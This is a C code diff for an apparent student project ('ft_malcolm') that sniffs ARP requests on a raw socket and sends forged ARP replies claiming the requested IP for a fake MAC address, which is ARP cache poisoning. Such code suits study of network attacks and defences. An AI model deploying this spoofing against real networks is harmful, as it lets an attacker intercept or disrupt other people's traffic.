@@ -5,6 +5,11 @@ uint16_t ft_ntohs(uint16_t netshort)
 	return swap_uint16(netshort);
 }
 
+uint16_t ft_htons(uint16_t netshort)
+{
+	return swap_uint16(netshort);
+}
+
 void print_ip(uint8_t *ip_address)
 {
 	int i = 0;
@@ -87,35 +92,40 @@ void debug_packet(struct ethernet_hdr *ethernet, struct arp_hdr *arp)
 	printf("_______________________________\n");
 }
 
-int send_back(int sockfd, struct ethernet_hdr *ethernet, struct arp_hdr *arp)
+int send_back(int sockfd, struct sockaddr_ll src_addr,
+	struct ethernet_hdr *ethernet, struct arp_hdr *arp)
 {
 	int ret;
+	socklen_t addr_len = sizeof(struct sockaddr_ll);
 	struct arp_packet packet = {0};
 
-	uint8_t dest_mac[ETH_ADDR_LEN] =
-		{0x66, 0x66, 0x66, 0x66, 0x66, 0x66};
-	uint8_t dest_ip[IP_ADDR_LEN] =
-		{66, 66, 66, 66};
-	(void)dest_mac;
-	(void)dest_ip;
-	(void)packet;
+	uint8_t dest_mac[ETH_ADDR_LEN] = {0x66, 0x66, 0x66, 0x66, 0x66, 0x66};
+	/* uint8_t dest_ip[IP_ADDR_LEN] = {66, 66, 66, 66}; */
+	uint8_t tmp_ip[IP_ADDR_LEN] = {0};
 
 	/* Fill the new packet */
 	packet.ethernet = *ethernet;
 	packet.arp = *arp;
 	/* Set the ARP opcode to reply */
-	packet.arp.op = ARP_REPLY;
+	packet.arp.op = ft_htons(ARP_REPLY);
 
+	/* Changing MAC addresses */
 	ft_memcpy(packet.arp.tha, packet.arp.sha, sizeof(packet.arp.sha));
 	ft_memcpy(packet.arp.sha, dest_mac, sizeof(packet.arp.sha));
 
-	ret = write(sockfd, &packet, sizeof(struct arp_packet));
+	/* Swapping IP addresses */
+	ft_memcpy(tmp_ip, packet.arp.sip, sizeof(packet.arp.sip));
+	ft_memcpy(packet.arp.sip, packet.arp.tip, sizeof(packet.arp.sip));
+	ft_memcpy(packet.arp.tip, tmp_ip, sizeof(packet.arp.sip));
+
+	ret = sendto(sockfd, &packet, sizeof(struct arp_packet), 0,
+		(struct sockaddr *)&src_addr, addr_len);
 	printf("Wrote: %d bytes in socket\n", ret);
 
 	return 0;
 }
 
-void handle_packet(int sockfd, char *buffer)
+void handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
 {
 	struct arp_hdr *arp;
 	struct ethernet_hdr *ethernet;
@@ -128,7 +138,7 @@ void handle_packet(int sockfd, char *buffer)
 
 	if (type == ETH_P_ARP) {
 		debug_packet(ethernet, arp);
-		send_back(sockfd, ethernet, arp);
+		send_back(sockfd, src_addr, ethernet, arp);
 	}
 }
 
@@ -138,6 +148,8 @@ int ft_malcolm(void)
 	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
 	char buffer[len];
 	int ret;
+	struct sockaddr_ll src_addr;
+	socklen_t addr_len = sizeof(struct sockaddr_ll);
 
 	/* Socket creation */
 	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
@@ -146,9 +158,10 @@ int ft_malcolm(void)
 	}
 
 	printf("Sniffing ARP packets...\n");
-	while ((ret = recv(sockfd, buffer, len, 0)) != -1) {
+	while ((ret = recvfrom(sockfd, buffer, len, 0,
+				(struct sockaddr *)&src_addr, &addr_len)) != -1) {
 		if (ret > 0)
-			handle_packet(sockfd, buffer);
+			handle_packet(sockfd, src_addr, buffer);
 	}
 
 	close(sockfd);
